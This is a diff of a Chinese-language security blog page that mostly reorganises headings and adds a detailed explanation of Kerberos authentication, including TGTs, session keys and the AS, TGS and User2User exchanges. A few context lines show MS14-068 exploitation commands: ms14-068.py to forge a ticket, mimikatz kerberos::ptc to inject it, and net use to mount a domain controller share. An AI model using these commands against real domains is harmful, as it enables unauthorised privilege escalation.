@@ -930,8 +930,8 @@
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1653">利用SYSVOL还原组策略中保存的密码</a></p>
 <h3 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h3><p>因为攻击者不需要域 Kerberos 服务帐户 （<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=483">KRBTGT</a>） NTLM 密码哈希（只能从具有域级管理员权限的域控制器访问）进行攻击。攻击者只需通过更改组成员身份来修改现有 TGT，使其有权访问 Active Directory 中的所有内容，并为 PAC 签名创建特定的无效校验和，从而导致 DC 对其进行验证。</p>
 <p><code>python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</code></p>
-<p>利用mimikatz将工具得到的<a href="mailto:&#84;&#71;&#84;&#95;&#100;&#111;&#x6d;&#97;&#105;&#110;&#x75;&#115;&#x65;&#114;&#64;&#x53;&#x45;&#x52;&#x56;&#x45;&#82;&#x2e;&#x43;&#x4f;&#x4d;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#101;">&#84;&#71;&#84;&#95;&#100;&#111;&#x6d;&#97;&#105;&#110;&#x75;&#115;&#x65;&#114;&#64;&#x53;&#x45;&#x52;&#x56;&#x45;&#82;&#x2e;&#x43;&#x4f;&#x4d;&#x2e;&#x63;&#99;&#x61;&#x63;&#x68;&#101;</a>写入内存，创建缓存证书：</p>
-<p>mimikatz.exe “kerberos::ptc c:<a href="mailto:&#84;&#x47;&#84;&#95;&#x64;&#97;&#x72;&#116;&#104;&#115;&#x69;&#x64;&#105;&#x6f;&#x75;&#x73;&#64;&#x70;&#x65;&#x6e;&#x74;&#x65;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d;&#x2e;&#x63;&#99;&#x61;&#99;&#x68;&#x65;">&#84;&#x47;&#84;&#95;&#x64;&#97;&#x72;&#116;&#104;&#115;&#x69;&#x64;&#105;&#x6f;&#x75;&#x73;&#64;&#x70;&#x65;&#x6e;&#x74;&#x65;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d;&#x2e;&#x63;&#99;&#x61;&#99;&#x68;&#x65;</a>“ exit</p>
+<p>利用mimikatz将工具得到的<a href="mailto:&#x54;&#x47;&#84;&#95;&#100;&#x6f;&#x6d;&#x61;&#105;&#x6e;&#x75;&#x73;&#x65;&#x72;&#x40;&#x53;&#x45;&#82;&#x56;&#69;&#x52;&#46;&#67;&#x4f;&#77;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#x65;">&#x54;&#x47;&#84;&#95;&#100;&#x6f;&#x6d;&#x61;&#105;&#x6e;&#x75;&#x73;&#x65;&#x72;&#x40;&#x53;&#x45;&#82;&#x56;&#69;&#x52;&#46;&#67;&#x4f;&#77;&#x2e;&#x63;&#99;&#97;&#99;&#x68;&#x65;</a>写入内存，创建缓存证书：</p>
+<p>mimikatz.exe “kerberos::ptc c:<a href="mailto:&#84;&#71;&#84;&#95;&#x64;&#x61;&#114;&#x74;&#x68;&#115;&#x69;&#x64;&#105;&#111;&#117;&#115;&#x40;&#x70;&#101;&#x6e;&#x74;&#x65;&#115;&#116;&#46;&#99;&#x6f;&#109;&#46;&#99;&#x63;&#x61;&#99;&#104;&#101;">&#84;&#71;&#84;&#95;&#x64;&#x61;&#114;&#x74;&#x68;&#115;&#x69;&#x64;&#105;&#111;&#117;&#115;&#x40;&#x70;&#101;&#x6e;&#x74;&#x65;&#115;&#116;&#46;&#99;&#x6f;&#109;&#46;&#99;&#x63;&#x61;&#99;&#104;&#101;</a>“ exit</p>
 <p>net use k: \pentest.comc$</p>
 <p>相关阅读 :</p>
 <p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=676">Kerberos的工具包PyKEK</a></p>
@@ -942,7 +942,7 @@
 <p><a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/network-penetration-testing/locate-and-attack-domain-sql-servers-without-scanning/">非扫描式的SQL Server发现</a></p>
 <p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1508">SPN扫描</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">扫描SQLServer的脚本</a></p>
-<h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p>Authentication解决的是“如何证明某个人确确实实就是他或她所声称的那个人”的问题。对于如何进行Authentication，我们采用这样的方法：如果一个秘密（secret）仅仅存在于A和B，那么有个人对B声称自己就是A，B通过让A提供这个秘密来证明这个人就是他或她所声称的A。这个过程实际上涉及到3个重要的关于Authentication的方面：</p>
+<h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>Authentication解决的是“如何证明某个人确确实实就是他或她所声称的那个人”的问题。对于如何进行Authentication，我们采用这样的方法：如果一个秘密（secret）仅仅存在于A和B，那么有个人对B声称自己就是A，B通过让A提供这个秘密来证明这个人就是他或她所声称的A。这个过程实际上涉及到3个重要的关于Authentication的方面：</p>
 <ul>
 <li>Secret如何表示。</li>
 <li>A如何向B提供Secret。</li>
@@ -954,10 +954,10 @@
 <p>因为<strong>Kserver-client</strong>只有Client和Server知道，所以被加密过的<strong>Kserver-client</strong>只能被Client和Server解密</p>
 <p>这时候在Server收到这两组信息之后，Server就会先通过<strong>Kserver-client</strong>对后者进行解密，就是解密2，然后将2和1进行比较，查看两者是否完全一样，如果完全一样，说明Client能提供正确的<strong>KServer-Client</strong>而这个世界上，仅仅只有真正的Client和自己知道<strong>KServer-Client</strong>，所以可以对方就是他所声称的那个人。</p>
 <p>Keberos大体上就是按照这样的一个原理来进行Authentication的。</p>
-<h2 id="Long-term-Key-x2F-Master-Key"><a href="#Long-term-Key-x2F-Master-Key" class="headerlink" title="Long-term Key&#x2F;Master Key"></a>Long-term Key&#x2F;Master Key</h2><p>在Security的领域中，有的Key可能长期内保持不变，比如你在密码，可能几年都不曾改变，这样的Key、以及由此派生的Key被称为Long-term Key。对于Long-term Key的使用有这样的原则：被Long-term Key加密的数据不应该在网络上传输。原因很简单，一旦这些被Long-term Key加密的数据包被恶意的网络监听者截获，在原则上，只要有充足的时间，他是可以通过计算获得你用于加密的Long-term Key的——任何加密算法都不可能做到绝对保密。</p>
+<h3 id="Long-term-Key-x2F-Master-Key"><a href="#Long-term-Key-x2F-Master-Key" class="headerlink" title="Long-term Key&#x2F;Master Key"></a>Long-term Key&#x2F;Master Key</h3><p>在Security的领域中，有的Key可能长期内保持不变，比如你在密码，可能几年都不曾改变，这样的Key、以及由此派生的Key被称为Long-term Key。对于Long-term Key的使用有这样的原则：被Long-term Key加密的数据不应该在网络上传输。原因很简单，一旦这些被Long-term Key加密的数据包被恶意的网络监听者截获，在原则上，只要有充足的时间，他是可以通过计算获得你用于加密的Long-term Key的——任何加密算法都不可能做到绝对保密。</p>
 <p>在一般情况下，对于一个Account来说，密码往往仅仅限于该Account的所有者知晓，甚至对于任何Domain的Administrator，密码仍然应该是保密的。但是密码却又是证明身份的凭据，所以必须通过基于你密码的派生的信息来证明用户的真实身份，在这种情况下，一般将你的密码进行Hash运算得到一个Hash code, 我们一般管这样的Hash Code叫做Master Key。由于Hash Algorithm是不可逆的，同时保证密码和Master Key是一一对应的，这样既保证了你密码的保密性，有同时保证你的Master Key和密码本身在证明你身份的时候具有相同的效力。</p>
-<h2 id="Short-term-Key-x2F-Session-Key"><a href="#Short-term-Key-x2F-Session-Key" class="headerlink" title="Short-term Key&#x2F;Session Key"></a>Short-term Key&#x2F;Session Key</h2><p>由于被Long-term Key加密的数据包不能用于网络传送，所以我们使用另一种Short-term Key来加密需要进行网络传输的数据。由于这种Key只在一段时间内有效，即使被加密的数据包被黑客截获，等他把Key计算出来的时候，这个Key早就已经过期了</p>
-<h2 id="引入Key-Distribution-KServer-Client从何而来"><a href="#引入Key-Distribution-KServer-Client从何而来" class="headerlink" title="引入Key Distribution: KServer-Client从何而来"></a>引入Key Distribution: KServer-Client从何而来</h2><p>上面说过Authentication时候用key来鉴定身份，这个key在client和Server之间传送，所以这个key一定是一个<strong>Short-term Key</strong>他仅仅在Client和Server的一个Session中有效，所以我们称这个Key为Client和Server之间的Session key（KServer-Client）</p>
+<h3 id="Short-term-Key-x2F-Session-Key"><a href="#Short-term-Key-x2F-Session-Key" class="headerlink" title="Short-term Key&#x2F;Session Key"></a>Short-term Key&#x2F;Session Key</h3><p>由于被Long-term Key加密的数据包不能用于网络传送，所以我们使用另一种Short-term Key来加密需要进行网络传输的数据。由于这种Key只在一段时间内有效，即使被加密的数据包被黑客截获，等他把Key计算出来的时候，这个Key早就已经过期了</p>
+<h3 id="引入Key-Distribution-KServer-Client从何而来"><a href="#引入Key-Distribution-KServer-Client从何而来" class="headerlink" title="引入Key Distribution: KServer-Client从何而来"></a>引入Key Distribution: KServer-Client从何而来</h3><p>上面说过Authentication时候用key来鉴定身份，这个key在client和Server之间传送，所以这个key一定是一个<strong>Short-term Key</strong>他仅仅在Client和Server的一个Session中有效，所以我们称这个Key为Client和Server之间的Session key（KServer-Client）</p>
 <p>那么Client和Server如何得到这个<strong>KServer-Client</strong>，这里就要说一个特别特别重要的角色，他就是<strong>Kerberos Distribution Center-KDC</strong>KDC在整个Kerberos Authentication中作为Client和Server共同信任的第三方起着重要的作用，而Kerberos的认证过程就是通过这3方协作完成。顺便说一下，Kerberos起源于希腊神话，是一支守护着冥界长着3个头颅的神犬，在keberos Authentication中，Kerberos的3个头颅代表中认证过程中涉及的3方：<strong>Client、Server和KDC</strong></p>
 <p>对于一个Windows Domain来说，Domain Controller就是KDC的角色，KDC维护着一个存储着该Domain中所有帐户的<strong>Account Database</strong>（一般地，这个Account Database由<strong>AD</strong>来维护），也就是说，他知道属于每个Account的名称和派生于该Account Password的<strong>Master Key</strong>。而用于Client和Server相互认证的<strong>KServer-Client</strong>就是有KDC分发。下面我们来看看KDC分发<strong>SServer-Client</strong>的过程。</p>
 <p>首先Client向KDC发送一个对<strong>SServer-Client</strong>的申请，申请内容大致为“<strong>我是某个Client，我需要一个Session Key用于访问某个Server</strong>”。当KDC接收到这个请求之后，他会生成1个Session Key，为了保证这个Session Key只有这个Client和他要访问的Server知道，KDC会给这个Session Key生成两个Copy，分别被Clinet和Server使用，然后从AD（Account Database）中提取Client和Server的Master Key分别对这两个Copy进行对称加密，对Server，和Session Key被一起加密的还有一些关于Client的信息，</p>
@@ -967,37 +967,93 @@
 
 <p>那么Kerberos他是怎么做的呢，他把这两个加密的Copy一起发送给Client，属于Server的Session Key由Client 发送给 Server</p>
 <p>可能有人会问，KDC并没有真正去认证这个发送请求的Client是否真的就是那个他所声称的那个人，就把Session Key发送给他，会不会有什么问题？如果另一个人（比如Client B）声称自己是Client A，他同样会得到Client A和Server的Session Key，这会不会有什么问题？实际上不存在问题，因为Client B声称自己是Client A，KDC就会使用Client A的Password派生的Master Key对Session Key进行加密，所以真正知道Client A 的Password的一方才会通过解密获得Session Key。</p>
-<h2 id="引入Authenticator-为有效的证明自己提供证据"><a href="#引入Authenticator-为有效的证明自己提供证据" class="headerlink" title="引入Authenticator - 为有效的证明自己提供证据"></a>引入Authenticator - 为有效的证明自己提供证据</h2><p>通过上面的过程，Client实际上获得了两组信息：一个通过自己Master Key加密的Session Key，另一个被Sever的Master Key加密的数据包，包含Session Key和关于自己的一些确认信息通过第一节，我们说只要通过一个双方知晓的Key就可以对对方进行有效的认证，但是在一个网络的环境中，这种简单的做法是具有安全漏洞，为此,Client需要提供更多的证明信息，我们把这种证明信息称为<strong>Authenticator</strong>，在Kerberos的Authenticator实际上就是<strong>关于Client的一些信息</strong>和当前时间的一个<strong>Timestamp</strong></p>
-<h3 id="在这里我们看看Server如何对Clinet进行验证DC"><a href="#在这里我们看看Server如何对Clinet进行验证DC" class="headerlink" title="在这里我们看看Server如何对Clinet进行验证DC"></a>在这里我们看看Server如何对Clinet进行验证DC</h3><p>Clinet通过自己的<strong>Master Key</strong>对KDC加密的Session Key进行解密，从而获得<strong>Session Key</strong>,然后创建一个<strong>Authenticator（Clinet Info + Timestamp）</strong> 然后用Session Key进行加密。最后同从KDC获得的，<strong>被Server的Master Key加密过的数据包（Client Info + Session Key）</strong>一同发送给Server端，这个通过Server的<strong>Master Key</strong>加密过的数据包被叫做<strong>Session Ticket</strong>。</p>
+<h3 id="引入Authenticator-为有效的证明自己提供证据"><a href="#引入Authenticator-为有效的证明自己提供证据" class="headerlink" title="引入Authenticator - 为有效的证明自己提供证据"></a>引入Authenticator - 为有效的证明自己提供证据</h3><p>通过上面的过程，Client实际上获得了两组信息：一个通过自己Master Key加密的Session Key，另一个被Sever的Master Key加密的数据包，包含Session Key和关于自己的一些确认信息通过第一节，我们说只要通过一个双方知晓的Key就可以对对方进行有效的认证，但是在一个网络的环境中，这种简单的做法是具有安全漏洞，为此,Client需要提供更多的证明信息，我们把这种证明信息称为<strong>Authenticator</strong>，在Kerberos的Authenticator实际上就是<strong>关于Client的一些信息</strong>和当前时间的一个<strong>Timestamp</strong></p>
+<p>在这里我们看看Server如何对Clinet进行验证DC</p>
+<p>Clinet通过自己的<strong>Master Key</strong>对KDC加密的Session Key进行解密，从而获得<strong>Session Key</strong>,然后创建一个<strong>Authenticator（Clinet Info + Timestamp）</strong> 然后用Session Key进行加密。最后同从KDC获得的，<strong>被Server的Master Key加密过的数据包（Client Info + Session Key）</strong>一同发送给Server端，这个通过Server的<strong>Master Key</strong>加密过的数据包被叫做<strong>Session Ticket</strong>。</p>
 <p>当Server接收到这两组数据后，先使用他<strong>自己的Master Key</strong>对Session Ticket进行解密，从而获得<strong>Session Key</strong>。随后使用该<strong>Session Key</strong>解密<strong>Authenticator</strong>，通过比较<strong>Authenticator中的Client Info</strong>和<strong>Session Ticket中的Client Info</strong>从而实现对Client的认证。</p>
-<h3 id="为什么要使用Timestamp"><a href="#为什么要使用Timestamp" class="headerlink" title="为什么要使用Timestamp"></a>为什么要使用Timestamp</h3><p>到这里，很多人可能认为这样的认证过程天衣无缝：只有当Client提供正确的Session Key方能得到Server的认证。但是在现实环境中，这存在很大的安全漏洞。</p>
+<p>为什么要使用Timestamp</p>
+<p>到这里，很多人可能认为这样的认证过程天衣无缝：只有当Client提供正确的Session Key方能得到Server的认证。但是在现实环境中，这存在很大的安全漏洞。</p>
 <p>我们试想这样的现象：Client向Server发送的数据包被某个恶意网络监听者截获，该监听者随后将数据包座位自己的Credential冒充该Client对Server进行访问，在这种情况下，依然可以很顺利地获得Server的成功认证。为了解决这个问题，Client在<strong>Authenticator</strong>中会加入一个当前时间的<strong>Timestamp</strong>。</p>
 <p>在Server对Authenticator中的Client Info和Session Ticket中的Client Info进行比较之前，会先提取Authenticator中的<strong>Timestamp</strong>，并同<strong>当前的时间</strong>进行比较，如果他们之间的偏差超出一个可以<strong>接受的时间范围（一般是5mins），</strong>Server会直接拒绝该Client的请求。在这里需要知道的是，Server维护着一个列表，这个列表记录着在这个可接受的时间范围内所有进行认证的Client和认证的时间。对于时间偏差在这个可接受的范围中的Client，Server会从这个这个列表中获得<strong>最近一个该Client的认证时间</strong>，只有当<strong>Authenticator中的Timestamp晚于通过一个Client的最近的认证时间</strong>的情况下，Server采用进行后续的认证流程。</p>
-<p><strong>Time Synchronization的重要性</strong></p>
-<p>上述 基于Timestamp的认证机制只有在Client和Server端的时间保持同步的情况才有意义。所以保持Time Synchronization在整个认证过程中显得尤为重要。在一个Domain中，一般通过访问同一个<strong>Time Service</strong>获得当前时间的方式来实现时间的同步。</p>
-<p><strong>双向认证（Mutual Authentication）</strong></p>
-<p>Kerberos一个重要的优势在于它能够提供双向认证：<strong>不但Server可以对Client 进行认证，Client也能对Server进行认证</strong>。</p>
+<h3 id="Time-Synchronization的重要性"><a href="#Time-Synchronization的重要性" class="headerlink" title="Time Synchronization的重要性"></a><strong>Time Synchronization的重要性</strong></h3><p>上述 基于Timestamp的认证机制只有在Client和Server端的时间保持同步的情况才有意义。所以保持Time Synchronization在整个认证过程中显得尤为重要。在一个Domain中，一般通过访问同一个<strong>Time Service</strong>获得当前时间的方式来实现时间的同步。</p>
+<h3 id="双向认证（Mutual-Authentication）"><a href="#双向认证（Mutual-Authentication）" class="headerlink" title="双向认证（Mutual Authentication）"></a><strong>双向认证（Mutual Authentication）</strong></h3><p>Kerberos一个重要的优势在于它能够提供双向认证：<strong>不但Server可以对Client 进行认证，Client也能对Server进行认证</strong>。</p>
 <p>具体过程是这样的，如果Client需要对他访问的Server进行认证，会在它向Server发送的Credential中设置一个是否需要认证的Flag。Server在对Client认证成功之后，会把Authenticator中的Timestamp提出出来，通过Session Key进行加密，当Client接收到并使用Session Key进行解密之后，如果确认<strong>Timestamp</strong>和原来的完全一致，那么他可以认定Server正式他试图访问的Server。</p>
 <p>那么为什么Server不直接把通过Session Key进行加密的Authenticator原样发送给Client，而要把Timestamp提取出来加密发送给Client呢？原因在于防止恶意的监听者通过获取的Client发送的Authenticator冒充Server获得Client的认证。</p>
-<h2 id="引入Ticket-Granting-Service"><a href="#引入Ticket-Granting-Service" class="headerlink" title="引入Ticket Granting Service"></a>引入Ticket Granting Service</h2><p>我们发现Kerberos实际上一个基于<strong>Ticket</strong>的认证方式，</p>
+<h3 id="引入Ticket-Granting-Service"><a href="#引入Ticket-Granting-Service" class="headerlink" title="引入Ticket Granting Service"></a>引入Ticket Granting Service</h3><p>我们发现Kerberos实际上一个基于<strong>Ticket</strong>的认证方式，</p>
 <p>Client想要获取Server端的资源，先得通过Server的认证；而认证的先决条件是Client向Server提供从KDC获得的一个有<strong>Server的Master Key</strong>进行加密的<strong>Session Ticket（Session Key + Client Info）</strong></p>
 <p>Session Ticket是Client进入Server领域的一张门票。而这张门票必须从一个合法的Ticket颁发机构获得，这个颁发机构就是<strong>Client和Server双方信任的KDC</strong>， 同时这张Ticket具有超强的防伪标识：它是被Server的Master Key加密的。对Client来说， 获得Session Ticket是整个认证过程中最为关键的部分。</p>
 <p>Client在从KDC那边获得Ticket之前，需要先获得这个Ticket的认购权证，这个认购权证在Kerberos中被称为<strong>TGT：Ticket Granting Ticket</strong>，TGT的分发方仍然是KDC</p>
-<h3 id="Client是如何从KDC处获得TGT的"><a href="#Client是如何从KDC处获得TGT的" class="headerlink" title="Client是如何从KDC处获得TGT的"></a>Client是如何从KDC处获得TGT的</h3><p>首先Client向KDC发起对TGT的申请，申请的内容大致可以这样表示：“<strong>我需要一张TGT用以申请获取用以访问所有Server的Ticket</strong>”。KDC在收到该申请请求后，生成一个用于该Client和KDC进行安全通信的<strong>Session Key（SKDC-Client）</strong>。为了保证该Session Key仅供该Client和自己使用，KDC使用<strong>Client的Master Key</strong>和<strong>自己的Master Key</strong>对生成的Session Key进行加密，从而获得两个加密的<strong>SKDC-Client</strong>的Copy。对于后者，随<strong>SKDC-Client</strong>一起被加密的还包含以后用于鉴定Client身份的关于Client的一些信息。最后KDC将这两份Copy一并发送给Client。这里有一点需要注意的是：为了免去KDC对于基于不同Client的Session Key进行维护的麻烦，就像Server不会保存<strong>Session Key（SServer-Client）</strong>一样，KDC也不会去保存这个Session Key（<strong>SKDC-Client</strong>），而选择完全靠Client自己提供的方式。</p>
+<p>Client是如何从KDC处获得TGT的</p>
+<p>首先Client向KDC发起对TGT的申请，申请的内容大致可以这样表示：“<strong>我需要一张TGT用以申请获取用以访问所有Server的Ticket</strong>”。KDC在收到该申请请求后，生成一个用于该Client和KDC进行安全通信的<strong>Session Key（SKDC-Client）</strong>。为了保证该Session Key仅供该Client和自己使用，KDC使用<strong>Client的Master Key</strong>和<strong>自己的Master Key</strong>对生成的Session Key进行加密，从而获得两个加密的<strong>SKDC-Client</strong>的Copy。对于后者，随<strong>SKDC-Client</strong>一起被加密的还包含以后用于鉴定Client身份的关于Client的一些信息。最后KDC将这两份Copy一并发送给Client。这里有一点需要注意的是：为了免去KDC对于基于不同Client的Session Key进行维护的麻烦，就像Server不会保存<strong>Session Key（SServer-Client）</strong>一样，KDC也不会去保存这个Session Key（<strong>SKDC-Client</strong>），而选择完全靠Client自己提供的方式。</p>
 <p>当Client收到KDC的两个加密数据包之后，先使用<strong>自己的Master Key</strong>对第一个Copy进行解密，从而获得KDC和Client的<strong>Session Key（SKDC-Client）</strong>，并把该Session 和TGT进行缓存。有了Session Key和TGT，Client自己的Master Key将不再需要，因为此后Client可以使用<strong>SKDC-Client</strong>向KDC申请用以访问每个Server的Ticket，相对于Client的Master Key这个Long-term Key，SKDC-Client是一个Short-term Key，安全保证得到更好的保障，这也是Kerberos多了这一步的关键所在。同时需要注意的是SKDC-Client是一个Session Key，他具有自己的生命周期，同时TGT和Session相互关联，当Session Key过期，TGT也就宣告失效，此后Client不得不重新向KDC申请新的TGT，KDC将会生成一个不同Session Key和与之关联的TGT。同时，由于Client Log off也导致SKDC-Client的失效，所以SKDC-Client又被称为<strong>Logon Session Key</strong>。</p>
 <p>接下来，我们看看Client如何使用TGT来从KDC获得基于某个Server的Ticket。在这里我要强调一下，Ticket是基于某个具体的Server的，而TGT则是和具体的Server无关的，Client可以使用一个TGT从KDC获得基于不同Server的Ticket。我们言归正传，Client在获得自己和KDC的<strong>Session Key（SKDC-Client）</strong>之后，生成自己的Authenticator以及所要访问的Server名称的并使用<strong>SKDC-Client</strong>进行加密。随后连同TGT一并发送给KDC。KDC使用<strong>自己的Master Key</strong>对TGT进行解密，提取Client Info和<strong>Session Key（SKDC-Client）</strong>，然后使用这个<strong>SKDC-Client</strong>解密Authenticator获得Client Info，对两个Client Info进行比较进而验证对方的真实身份。验证成功，生成一份基于Client所要访问的Server的Ticket给Client，</p>
-<h1 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h1><p>在域上抓取的哈希</p>
+<p><img src="/image/picture/tgt.png" alt="这是图片"></p>
+<p>这里我简单画了一下应该就是这样</p>
+<h3 id="Kerberos的3个Sub-protocol：整个Authentication"><a href="#Kerberos的3个Sub-protocol：整个Authentication" class="headerlink" title="Kerberos的3个Sub-protocol：整个Authentication"></a>Kerberos的3个Sub-protocol：整个Authentication</h3><p><strong>Authentication Service Exchange</strong></p>
+<p>通过这个Sub-protocol，KDC（确切地说是KDC中的Authentication Service）实现对Client身份的确认，并颁发给该Client一个TGT。具体过程如下：</p>
+<p>Client向KDC的Authentication Service发送Authentication Service Request（<strong>KRB_AS_REQ</strong>）, 为了确保KRB_AS_REQ仅限于自己和KDC知道，Client使用自己的Master Key对KRB_AS_REQ的主体部分进行加密（KDC可以通过Domain 的Account Database获得该Client的Master Key）。KRB_AS_REQ的大体包含以下的内容：</p>
+<ul>
+<li>Pre-authentication data：包含用以证明自己身份的信息。说白了，就是证明自己知道自己声称的那个account的Password。一般地，它的内容是一个被Client的Master key加密过的Timestamp。</li>
+<li>Client name &amp; realm: 简单地说就是Domain name\Client</li>
+<li>Server Name：注意这里的Server Name并不是Client真正要访问的Server的名称，而我们也说了TGT是和Server无关的（Client只能使用Ticket，而不是TGT去访问Server）。这里的Server Name实际上是<strong>KDC的Ticket Granting Service的Server Name</strong>。</li>
+</ul>
+<p>AS（Authentication Service）通过它接收到的KRB_AS_REQ验证发送方的是否是在Client name &amp; realm中声称的那个人，也就是说要验证发送放是否知道Client的Password。所以AS只需从Account Database中提取Client对应的Master Key对Pre-authentication data进行解密，如果是一个合法的Timestamp，则可以证明发送放提供的是正确无误的密码。验证通过之后，AS将一份Authentication Service Response（KRB_AS_REP）发送给Client。KRB_AS_REQ主要包含两个部分：本Client的Master Key加密过的Session Key（SKDC-Client：Logon Session Key）和被自己（KDC）加密的TGT。而TGT大体又包含以下的内容：</p>
+<ul>
+<li>Session Key: SKDC-Client：Logon Session Key</li>
+<li>Client name &amp; realm: 简单地说就是Domain name\Client</li>
+<li>End time: TGT到期的时间。</li>
+</ul>
+<p>Client通过自己的Master Key对第一部分解密获得Session Key（SKDC-Client：Logon Session Key）之后，携带着TGT便可以进入下一步：TGS（Ticket Granting Service）Exchange。</p>
+<p><strong>2． TGS（Ticket Granting Service）Exchange</strong></p>
+<p>TGS（Ticket Granting Service）Exchange通过Client向KDC中的TGS（Ticket Granting Service）发送Ticket Granting Service Request（<strong>KRB_TGS_REQ</strong>）开始。KRB_TGS_REQ大体包含以下的内容：</p>
+<ul>
+<li>TGT：Client通过AS Exchange获得的Ticket Granting Ticket，TGT被KDC的Master Key进行加密。</li>
+<li>Authenticator：用以证明当初TGT的拥有者是否就是自己，所以它必须以TGT的办法方和自己的Session Key（SKDC-Client：Logon Session Key）来进行加密。</li>
+<li>Client name &amp; realm: 简单地说就是Domain name\Client。</li>
+<li>Server name &amp; realm: 简单地说就是Domain name\Server，这回是Client试图访问的那个Server。</li>
+</ul>
+<p>TGS收到KRB_TGS_REQ在发给Client真正的Ticket之前，先得整个Client提供的那个TGT是否是AS颁发给它的。于是它不得不通过Client提供的Authenticator来证明。但是Authentication是通过<strong>Logon Session Key（SKDC-Client）</strong>进行加密的，而自己并没有保存这个Session Key。所以TGS先得通过自己的Master Key对Client提供的TGT进行解密，从而获得这个Logon Session Key（SKDC-Client），再通过这个<strong>Logon Session Key（SKDC-Client）</strong>解密Authenticator进行验证。验证通过向对方发送Ticket Granting Service Response（KRB_TGS_REP）。这个KRB_TGS_REP有两部分组成：使用<strong>Logon Session Key（SKDC-Client）</strong>加密过用于Client和Server的<strong>Session Key（SServer-Client）</strong>和使用<strong>Server的Master Key</strong>进行加密的Ticket。该Ticket大体包含以下一些内容：</p>
+<ul>
+<li>Session Key：SServer-Client。</li>
+<li>Client name &amp; realm: 简单地说就是Domain name\Client。</li>
+<li>End time: Ticket的到期时间。</li>
+</ul>
+<p>Client收到KRB_TGS_REP，使用<strong>Logon Session Key（SKDC-Client）</strong>解密第一部分后获得<strong>Session Key（SServer-Client）</strong>。有了Session Key和Ticket，Client就可以之间和Server进行交互，而无须在通过KDC作中间人了。所以我们说Kerberos是一种高效的认证方式，它可以直接通过Client和Server双方来完成，不像Windows NT 4下的NTLM认证方式，每次认证都要通过一个双方信任的第3方来完成。</p>
+<p>我们现在来看看 Client如果使用Ticket和Server怎样进行交互的，这个阶段通过我们的第3个Sub-protocol来完成：<strong>CS（Client&#x2F;Server ）Exchange</strong>。</p>
+<p><strong>3． CS（Client&#x2F;Server ）Exchange</strong></p>
+<p>这个已经在本文的第二节中已经介绍过，对于重复发内容就不再累赘了。Client通过TGS Exchange获得Client和Server的<strong>Session Key（SServer-Client）</strong>，随后创建用于证明自己就是Ticket的真正所有者的Authenticator，并使用<strong>Session Key（SServer-Client）</strong>进行加密。最后将这个被加密过的Authenticator和Ticket作为Application Service Request（KRB_AP_REQ）发送给Server。除了上述两项内容之外，KRB_AP_REQ还包含一个Flag用于表示Client是否需要进行双向验证（Mutual Authentication）。</p>
+<p>Server接收到KRB_AP_REQ之后，通过自己的Master Key解密Ticket，从而获得Session Key（SServer-Client）。通过Session Key（SServer-Client）解密Authenticator，进而验证对方的身份。验证成功，让Client访问需要访问的资源，否则直接拒绝对方的请求。</p>
+<p>对于需要进行双向验证，Server从Authenticator提取Timestamp，使用Session Key（SServer-Client）进行加密，并将其发送给Client用于Client验证Server的身份。</p>
+<p>到此为止，Kerberos的整个过程大体上已经介绍完毕。不知道他们有没有意识到这其中有什么安全隐患？我在一开始在介绍Long-term Key和Short-term Key的时候就已经强调过：被Long-term Key加密的信息最好不要在网络中传递，然后Client从KDC获得的Ticket确是通过Server的Master Key加密的，这显然对Server来说是不安全的，为了解决这个问题，Kerberos引入了第4个Sub-protocol: User2User。关于User2User Protocol，敬请关注本Blog的<a target="_blank" rel="noopener" href="http://www.cnblogs.com/artech/archive/2007/07/10/811970.html">第三部分</a>。</p>
+<h3 id="User2User-Sub-Protocol：有效地保障Server的安全"><a href="#User2User-Sub-Protocol：有效地保障Server的安全" class="headerlink" title="User2User Sub-Protocol：有效地保障Server的安全"></a>User2User Sub-Protocol：有效地保障Server的安全</h3><p>但是对于3个Sub-Protocol的C&#x2F;S Exchange，Client携带的Ticket却是被<strong>Server Master Key</strong>进行加密的，这显现不符合我们提出的原则，降低Server的安全系数。</p>
+<p>所以我们必须寻求一种解决方案来解决上面的问题。这个解决方案很明显：就是采用一个Short-term的Session Key，而不是Server Master Key对Ticket进行加密。这就是我们今天要介绍的Kerberos的<strong>User2User Protocol.<strong>我们知道，既然是Session Key，仅必然涉及到两方，而在Kerberos整个认证过程涉及到3方：Client、Server和KDC，所以用于加密Ticket的只可能是Server和KDC之间的</strong>Session Key（SKDC-Server）。</strong></p>
+<ol>
+<li>AS Exchange：Client通过此过程获得了属于自己的TGT，有了此TGT，Client可凭此向KDC申请用于访问某个Server的Ticket。</li>
+<li>这一步的主要任务是获得封装了Server和KDC的Session Key（SKDC-Server）的属于Server的TGT。如果该TGT存在于Server的缓存中，则Server会直接将其返回给Client。否则通过AS Exchange从KDC获取。</li>
+<li>TGS Exchange：Client通过向KDC提供自己的TGT，Server的TGT以及Authenticator向KDC申请用于访问Server的Ticket。KDC使用先用自己的Master Key解密Client的TGT获得SKDC-Client，通过SKDC-Client解密Authenticator验证发送者是否是TGT的真正拥有者，验证通过再用自己的Master Key解密Server的TGT获得KDC和Server 的Session Key（SKDC-Server），并用该Session Key加密Ticket返回给Client。</li>
+<li>C&#x2F;S Exchange：Client携带者通过KDC和Server 的Session Key（SKDC-Server）进行加密的Ticket和通过Client和Server的Session Key（SServer-Client）的Authenticator访问Server，Server通过SKDC-Server解密Ticket获得SServer-Client，通过SServer-Client解密Authenticator实现对Client的验证。</li>
+</ol>
